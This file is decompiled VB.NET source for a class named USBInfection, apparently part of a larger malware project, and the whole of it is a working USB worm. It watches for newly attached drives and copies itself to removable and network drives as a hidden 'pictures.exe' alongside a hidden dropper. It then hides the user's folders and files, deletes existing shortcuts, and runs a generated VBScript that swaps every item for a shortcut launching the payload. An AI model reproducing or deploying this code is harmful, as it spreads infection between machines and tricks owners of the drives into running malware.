Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Management
Imports System.Threading
Imports System.Windows.Forms
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x0200005F RID: 95
	Friend Class USBInfection
		' Token: 0x060001E3 RID: 483 RVA: 0x000116A4 File Offset: 0x0000F8A4
		Public Sub StartUSBService()
			Try
				Dim managementEventWatcher As ManagementEventWatcher = New ManagementEventWatcher()
				Dim wqlEventQuery As WqlEventQuery = New WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2")
				AddHandler managementEventWatcher.EventArrived, AddressOf Me.WatcherOnEventArrived
				managementEventWatcher.Query = wqlEventQuery
				managementEventWatcher.Start()
				managementEventWatcher.WaitForNextEvent()
			Catch
			End Try
		End Sub

		' Token: 0x060001E4 RID: 484 RVA: 0x00011700 File Offset: 0x0000F900
		Private Sub WatcherOnEventArrived(sender As Object, e As EventArrivedEventArgs)
			Try
				Dim drives As DriveInfo() = DriveInfo.GetDrives()
				If drives.Length <> 0 Then
					For Each driveInfo As DriveInfo In drives
						If driveInfo.IsReady AndAlso (driveInfo.DriveType = DriveType.Removable OrElse driveInfo.DriveType = DriveType.Network) Then
							Try
								Me.InfectDrive(driveInfo.Name)
							Catch
							End Try
						End If
					Next
				End If
			Catch
			End Try
		End Sub

		' Token: 0x060001E5 RID: 485 RVA: 0x0001178C File Offset: 0x0000F98C
		Private Sub InfectDrive(drive_name As String)
			Try
				If Not File.Exists(drive_name + "pictures.exe") Then
					File.Copy(Application.ExecutablePath, drive_name + "pictures.exe")
					File.SetAttributes(drive_name + "pictures.exe", FileAttributes.Hidden)
				End If
				If Not File.Exists(drive_name + "USBStarter.exe") Then
					File.WriteAllBytes(drive_name + "USBStarter.exe", Resources.USBStarter)
					File.SetAttributes(drive_name + "USBStarter.exe", FileAttributes.Hidden)
				End If
				For Each text As String In Directory.GetDirectories(drive_name, "*", SearchOption.TopDirectoryOnly)
					Try
						If Not text.StartsWith("pic") Then
							New DirectoryInfo(text).Attributes = FileAttributes.Hidden Or FileAttributes.Directory
						End If
					Catch
					End Try
				Next
				For Each text2 As String In Directory.GetFiles(drive_name, "*", SearchOption.TopDirectoryOnly)
					Try
						If Not text2.StartsWith("pic") Then
							Dim fileInfo As FileInfo = New FileInfo(text2)
							fileInfo.Attributes = FileAttributes.Hidden Or FileAttributes.Directory
							If fileInfo.Extension = ".lnk" Then
								fileInfo.Delete()
							End If
						End If
					Catch
					End Try
				Next
				Dim text3 As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "uspread.vbs")
				If Not File.Exists(text3) Then
					File.Delete(text3)
				End If
				Dim text4 As String = "On Error Resume Next" & vbCrLf & "objStartFolder = """ + drive_name.Replace("\", "") + "\""" & vbCrLf & "Set objFSO = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & "For Each objFolder In objFSO.GetFolder(objStartFolder).SubFolders" & vbTab & vbCrLf & vbTab & "Set objShell = WScript.CreateObject(""WScript.Shell"")" & vbCrLf & "    Set lnk = objShell.CreateShortcut(objStartFolder + objFolder.Name + "".lnk"")" & vbCrLf & "   lnk.TargetPath = objStartFolder + ""USBStarter.exe"" " & vbCrLf & "   lnk.Arguments = objFolder.Name + ""\""" & vbCrLf & "   lnk.Description = objFolder.Name" & vbCrLf & "   lnk.HotKey = ""ALT+CTRL+F""" & vbCrLf & "   lnk.IconLocation =  ""%SystemRoot%\system32\SHELL32.dll,4""" & vbCrLf & "   lnk.WindowStyle = ""1""" & vbCrLf & "   lnk.WorkingDirectory = objStartFolder" & vbCrLf & "   lnk.Save" & vbCrLf & "      'Clean up " & vbCrLf & "   Set lnk = Nothing" & vbCrLf & "Next" & vbCrLf & "Set objFolder = objFSO.GetFolder(objStartFolder)" & vbCrLf & "Set colFiles = objFolder.Files" & vbCrLf & "For Each objFile in colFiles" & vbCrLf & vbTab & "Set objShell = WScript.CreateObject(""WScript.Shell"")" & vbCrLf & "   Set lnk = objShell.CreateShortcut(objStartFolder + objFile.Name + "".lnk"")" & vbCrLf & "    ext=Split(objFile.Name,""."")" & vbCrLf & "if (objFile.Name <> ""USBStarter.exe"")then" & vbCrLf & vbTab & "if (objFile.Name <> ""pictures.exe"")then" & vbCrLf & "if ext(1) <> ""lnk"" then" & vbCrLf & "   lnk.TargetPath = objStartFolder + ""USBStarter.exe"" " & vbCrLf & "   lnk.Arguments = objFile.Name" & vbCrLf & "   lnk.Description = objFile.Name" & vbCrLf & "   lnk.HotKey = ""ALT+CTRL+F""" & vbCrLf & "   lnk.IconLocation = objStartFolder + objFile.Name + "", 0""" & vbCrLf & "   lnk.WindowStyle = ""1""" & vbCrLf & "   lnk.WorkingDirectory = objStartFolder" & vbCrLf & "   lnk.Save" & vbCrLf & "   end if" & vbCrLf & "end if" & vbCrLf & vbTab & "end if" & vbCrLf & "   'Clean up " & vbCrLf & "   Set lnk = Nothing" & vbCrLf & "Next" & vbCrLf
				File.WriteAllText(text3, text4)
				File.SetAttributes(text3, FileAttributes.Hidden)
				Thread.Sleep(400)
				Process.Start(text3)
			Catch
			End Try
		End Sub
	End Class
End Namespace
